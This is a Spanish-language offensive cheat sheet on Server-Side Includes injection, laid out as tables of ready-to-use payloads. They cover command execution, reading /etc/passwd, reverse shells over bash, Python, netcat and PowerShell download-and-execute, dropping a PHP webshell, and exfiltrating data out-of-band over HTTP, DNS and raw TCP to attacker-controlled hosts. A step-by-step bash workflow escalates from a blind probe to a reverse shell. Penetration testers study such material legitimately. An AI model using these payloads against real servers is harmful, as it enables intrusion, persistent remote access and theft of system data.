---
aliases:
  - SSI exec cmd
  - SSI RCE
  - SSI Reverse Shell
  - SSI OOB
tags:
  - vuln/ssi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Ejecución de Comandos

---

## RCE Linux / Windows Básico

| **Payload**                                        | **Qué obtenés**                           | **Cuándo**                              |
| -------------------------------------------------- | ----------------------------------------- | --------------------------------------- |
| `<!--#exec cmd="id" -->`                           | uid/gid del usuario del webserver         | Probe estándar de RCE                   |
| `<!--#exec cmd="whoami" -->`                       | Nombre del usuario (www-data/apache/IUSR) | Confirmar contexto                      |
| `<!--#exec cmd="uname -a" -->`                     | Kernel + arquitectura                     | Buscar CVEs de kernel post-RCE          |
| `<!--#exec cmd="dir C:\\" -->`                     | Listado de `C:\`                          | Target Windows/IIS                      |
| `<!--#exec cmd="powershell.exe -enc <base64>" -->` | Ejecuta payload PowerShell codificado     | Evadir filtros de caracteres en Windows |
| `<!--#exec cmd="cat /etc/passwd" -->`              | Usuarios del sistema                      | Lectura directa de archivo              |
| `<!--#exec cmd="id; whoami; hostname" -->`         | id + user + hostname encadenados          | Recon en un solo disparo                |
| `<!--#exec cmd='id' -->`                           | Mismo RCE con comillas simples            | Si `"` está filtrado                    |
| `<!--#exec cmd=id -->`                             | RCE sin comillas                          | Parsers permisivos                      |
| `<!--#exec cgi="/cgi-bin/foo" -->`                 | Ejecuta un CGI y embebe su salida         | Cuando `cmd` está bloqueado             |

^ssi-exec-basic

---

## Reverse Shells

| **Payload** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" -->` | Shell interactiva (bash) | Vector estándar Linux |
| `<!--#exec cmd="bash >& /dev/tcp/<IP>/<PORT> 0>&1" -->` | Igual, forma compacta | Variante |
| `<!--#exec cmd="python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'" -->` | Shell vía Python | Si hay `python3` |
| `<!--#exec cmd="nc <IP> <PORT> -e /bin/sh" -->` | Shell vía netcat | Si `nc` tiene `-e` |
| `<!--#exec cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc <IP> <PORT> >/tmp/f" -->` | Shell sin `nc -e` (truco FIFO) | netcat sin `-e` |
| `<!--#exec cmd="powershell -nop -c 'IEX(New-Object Net.WebClient).downloadString(\"http://<IP>/rev.ps1\")'" -->` | Shell en Windows | Target IIS/Windows |
| `<!--#exec cmd="echo '<?php system($_GET[c]); ?>' > /var/www/html/sh.php" -->` | Dropea una webshell PHP | Persistencia / si co-existe PHP |

^ssi-exec-revshell

> [!note] Pre-step: listener del atacante → `nc -lvnp <PORT>`. Para payloads complejos, codificá en base64 y decodificá en el target para esquivar filtros de caracteres.

---

## OOB Exfil (Blind RCE)

| **Payload** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `<!--#exec cmd="curl http://<collab>/?d=$(id\|base64)" -->` | Output de `id` por callback HTTP | RCE ciego con egress HTTP |
| `<!--#exec cmd="wget http://<collab>/?d=$(whoami)" -->` | User por callback HTTP | Alternativa a curl |
| `<!--#exec cmd="nslookup $(whoami).<collab>.oast.fun" -->` | User exfiltrado por DNS | Solo egress DNS |
| `<!--#exec cmd="dig $(whoami).<collab>.oast.fun" -->` | Igual vía `dig` | Alternativa DNS |
| `<!--#exec cmd="sleep 10" -->` | Delay observable en la respuesta | Confirmar exec a ciegas |
| `<!--#exec cmd="if [ $(id -u) = 0 ]; then sleep 10; fi" -->` | Delay condicional | Oráculo booleano (¿es root?) |
| `<!--#exec cmd="cat /etc/passwd > /dev/tcp/<IP>/<PORT>" -->` | Exfil de archivo por TCP crudo | Bash `/dev/tcp` |

^ssi-exec-oob

### Standard SSI OOB workflow

```bash
# 1. Setup Burp Collaborator or interactsh-client
COLLAB="<unique>.oast.fun"

# 2. Inject probe
PAYLOAD='<!--#exec cmd="curl http://'$COLLAB'/?d=$(id|base64 -w0)" -->'

# 3. Send via vulnerable input
curl --data-urlencode "q=$PAYLOAD" https://target/search.shtml

# 4. Watch Collaborator dashboard
# Atacante recibe HTTP request con base64-encoded `id` output

# 5. Decode
echo "<base64>" | base64 -d
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 6. Confirm RCE → escalate to reverse shell
PAYLOAD='<!--#exec cmd="bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"" -->'
```

---

## Requisitos para que `#exec` Funcione

| **Requisito** | **Detalle** | **Cómo verificar** |
|---|---|---|
| `mod_include` habilitado | Módulo SSI de Apache cargado | `apachectl -M \| grep include` |
| `Options +Includes` activo | En vhost o `.htaccess` | Config, o probe con `#echo` |
| `+IncludesNOEXEC` ausente | Si está presente, `#exec` queda bloqueado (pero `#include` sigue) | Probe `<!--#exec cmd="id" -->` |
| Extensión server-parsed | `.shtml` / `.shtm` / `.stm` o MIME `text/x-server-parsed-html` | Handler del server |
| Usuario objetivo | El RCE corre como www-data / apache / IUSR | `<!--#exec cmd="id" -->` |
| IIS | SSI vía handler mappings | IIS Manager |

^ssi-exec-requirements

> [!warning] Si `+IncludesNOEXEC` está activo → `#exec` muere, pero `#include` sigue funcionando: pivotear a LFI (ver [[SSI - Inclusion de Archivos]]). Si `mod_include` está deshabilitado o la extensión no se parsea, el vector está muerto (devuelve HTML crudo).

---
